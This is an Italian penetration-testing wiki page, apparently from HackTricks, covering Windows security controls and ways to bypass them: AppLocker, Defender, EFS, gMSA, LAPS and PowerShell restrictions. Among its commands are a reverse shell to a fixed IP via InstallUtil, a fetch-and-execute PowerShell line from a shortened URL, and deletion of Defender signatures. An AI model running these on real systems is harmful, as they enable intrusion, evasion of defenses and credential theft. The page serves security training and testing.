# Controlli di sicurezza di Windows

{{#include ../banners/hacktricks-training.md}}

## Criteri AppLocker

Una whitelist delle applicazioni è un elenco di applicazioni software o eseguibili approvati che possono essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannosi e software non approvati che non soddisfano le specifiche esigenze aziendali di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di whitelisting delle applicazioni** di Microsoft e consente agli amministratori di sistema di controllare **quali applicazioni e file gli utenti possono eseguire**. Offre un **controllo granulare** su eseguibili, script, file Windows Installer, DLL, app pacchettizzate e installer di app pacchettizzati.\
È comune che le organizzazioni **blocchino cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto questo può essere bypassato**.

### Verifica

Verifica quali file/estensioni sono inseriti nella blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` valuta i file candidati per un'identità specifica in base a una policy AppLocker. Testa l'account il cui token eseguirà il payload, poiché le regole possono applicarsi a utenti o gruppi; `Get-AppLockerFileInformation` è utile anche per esaminare il percorso, l'hash e i metadati del publisher sui quali le regole possono verificare la corrispondenza.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Questo percorso del registro contiene le configurazioni e le policy applicate da AppLocker, offrendo un modo per esaminare l'insieme attuale di regole applicate nel sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** utili per bypassare la Policy di AppLocker: se AppLocker consente di eseguire qualsiasi elemento all'interno di `C:\Windows\System32` o `C:\Windows`, sono disponibili **writable folders** che puoi usare per **bypassare questa policy**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- I binari [**"LOLBAS's"**](https://lolbas-project.github.io/) comunemente **trusted** possono essere utili anche per bypassare AppLocker.
- Anche le **regole scritte male potrebbero essere bypassate**
- Ad esempio, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e questa sarà consentita.
- Le organizzazioni spesso si concentrano anche sul **bloccare l'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano le **altre** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **L'enforcement delle DLL è molto raramente abilitato** a causa del carico aggiuntivo che può imporre a un sistema e della quantità di test necessaria per assicurarsi che nulla si rompa. Pertanto, usare le **DLL come backdoor** aiuterà a bypassare AppLocker.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Le credenziali locali si trovano in questo file; le password sono sottoposte a hashing.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (sottoposte a hashing) vengono **salvate nella** **memoria** di questo sottosistema per motivi di Single Sign-On.\
**LSA** amministra la **security policy** locale (policy delle password, permessi degli utenti...), l'**autenticazione**, gli **access token**...\
LSA sarà il componente che **verificherà** le credenziali fornite all'interno del file **SAM** (per un accesso locale) e **comunicherà** con il **domain controller** per autenticare un utente del dominio.

Le **credenziali** vengono **salvate all'interno del processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decrittabili.

### LSA secrets

LSA potrebbe salvare su disco alcune credenziali:

- Password dell'account computer dell'Active Directory (domain controller irraggiungibile).
- Password degli account dei Windows services
- Password per i task pianificati
- Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database dell'Active Directory. È presente solo nei Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un Antivirus disponibile in Windows 10 e Windows 11 e nelle versioni di Windows Server. **Blocca** i comuni tool di pentesting come **`WinPEAS`**. Tuttavia, esistono modi per **bypassare queste protezioni**.

### Check

Per verificare lo **status** di **Defender** puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo puoi anche eseguire:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protegge i file tramite crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave viene crittografata con la **chiave pubblica** dell'utente e memorizzata nell'**alternative data stream** $EFS del file crittografato. Quando è necessaria la decrittografia, la **chiave privata** corrispondente al certificato digitale dell'utente viene utilizzata per decrittografare la FEK dallo stream $EFS. Maggiori dettagli sono disponibili [qui](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Gli scenari di decrittografia senza iniziativa dell'utente** includono:

- Quando file o cartelle vengono spostati su un file system non-EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono automaticamente decrittografati.
- I file crittografati inviati sulla rete tramite il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente al proprietario un **accesso trasparente** ai file crittografati. Tuttavia, cambiare semplicemente la password del proprietario ed effettuare l'accesso non consentirà la decrittografia.

**Punti chiave**:

- EFS utilizza una FEK simmetrica, crittografata con la chiave pubblica dell'utente.
- La decrittografia utilizza la chiave privata dell'utente per accedere alla FEK.
- La decrittografia automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione sulla rete.
- I file crittografati sono accessibili al proprietario senza ulteriori operazioni.

### Controllare le informazioni su EFS

Verificare se un **utente** ha **utilizzato** questo **servizio**, controllando se questo percorso esiste:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Controllare **chi** ha **accesso** al file utilizzando cipher /c \<file>\
È inoltre possibile utilizzare `cipher /e` e `cipher /d` all'interno di una cartella per **crittografare** e **decrittografare** tutti i file

### Decrittografare i file EFS

#### Essere Authority System

Questo approccio richiede che l'**utente vittima** stia **eseguendo** un **processo** sull'host. In tal caso, da una sessione `meterpreter` è possibile impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). In alternativa, è possibile eseguire `migrate` nel processo dell'utente.

#### Conoscere la password dell'utente

Mimikatz può importare il certificato e la chiave privata dell'utente, quindi utilizzarli per decrittografare i file protetti da EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato i **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali, che spesso hanno l'impostazione "**Password never expire**" abilitata, i gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: i gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base ai criteri del dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali delle password.
- **Sicurezza migliorata**: questi account sono immuni ai lockout e non possono essere utilizzati per gli accessi interattivi, aumentando la loro sicurezza.
- **Supporto per più host**: i gMSA possono essere condivisi tra più host, rendendoli ideali per i servizi in esecuzione su più server.
- **Supporto per le attività pianificate**: a differenza dei managed service accounts, i gMSA supportano l'esecuzione di attività pianificate.
- **Gestione semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando cambiano i dettagli sAMaccount o il nome DNS del computer, semplificando la gestione degli SPN.

Le password dei gMSA sono memorizzate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono reimpostate automaticamente ogni 30 giorni dai Domain Controller (DC). Questa password, un blob di dati crittografato noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo dagli amministratori autorizzati e dai server sui quali sono installati i gMSA, garantendo un ambiente sicuro. Per accedere a queste informazioni è necessaria una connessione protetta come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

È possibile leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trova maggiori informazioni in questo post**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Inoltre, consulta questa [pagina web](https://cube0x0.github.io/Relaying-for-gMSA/) per scoprire come eseguire un **NTLM relay attack** per **leggere** la **password** di **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Durante l'enumerazione, distingui **legacy Microsoft LAPS** dall'implementazione nativa **Windows LAPS**. Windows LAPS è stato distribuito con gli aggiornamenti di Windows dell'11 aprile 2023 e può eseguire il backup della password di un amministratore locale gestito in **Windows Server Active Directory** o in **Microsoft Entra ID**. Nelle distribuzioni basate su AD può inoltre crittografare le password, conservare la cronologia delle password crittografate e gestire la password DSRM di un domain controller. Il legacy MSI scaricabile è deprecato nelle versioni più recenti di Windows, sebbene Windows LAPS possa funzionare in modalità di emulazione legacy.<sup>[[6]](#references)</sup>

Poiché legacy Microsoft LAPS e Windows LAPS sono implementazioni separate, identifica quale delle due è distribuita prima di applicare attacchi specifici per attributi o cmdlet. La pagina collegata tratta discovery, enumerazione degli ACL, retrieval, manipolazione della scadenza e recovery offline senza duplicare qui tali procedure.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **limita molte delle funzionalità** necessarie per utilizzare PowerShell in modo efficace, ad esempio bloccando gli oggetti COM, consentendo solo i tipi .NET approvati, i workflow basati su XAML, le classi PowerShell e altro ancora.

### **Verifica**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Nelle versioni correnti di Windows quel Bypass non funzionerà, ma puoi usare[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potresti dover** **aggiungere un riferimento** -> _Sfoglia_ ->_Sfoglia_ -> aggiungere `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **cambiare il progetto a .Net4.5**.

#### Bypass diretto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire** codice **Powershell** in qualsiasi processo e bypassare la modalità vincolata. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Criteri di esecuzione di PS

Per impostazione predefinita è impostato su **restricted.** Modi principali per bypassare questo criterio:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Ulteriori informazioni sono disponibili [qui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

È l'API che può essere utilizzata per autenticare gli utenti.

SSPI sarà responsabile dell'individuazione del protocollo appropriato per due macchine che desiderano comunicare. Il metodo preferito è Kerberos. Successivamente, SSPI negozierà quale protocollo di autenticazione utilizzare; questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL ed entrambe le macchine devono supportare lo stesso protocollo per poter comunicare.

### Principali SSP

- **Kerberos**: quello preferito
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: per motivi di compatibilità
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: server web e LDAP, password sotto forma di hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: viene utilizzato per negoziare il protocollo da usare (Kerberos o NTLM, con Kerberos come impostazione predefinita)
- %windir%\Windows\System32\lsasrv.dll

#### La negoziazione può offrire diversi metodi o soltanto uno.

## UAC - Controllo dell'account utente

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Bypassare AppLocker e la modalità con linguaggio vincolato di PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [come decrittografare i file EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying per gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 modi per bypassare la PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Utilizzare i cmdlet di AppLocker per Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Panoramica di Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
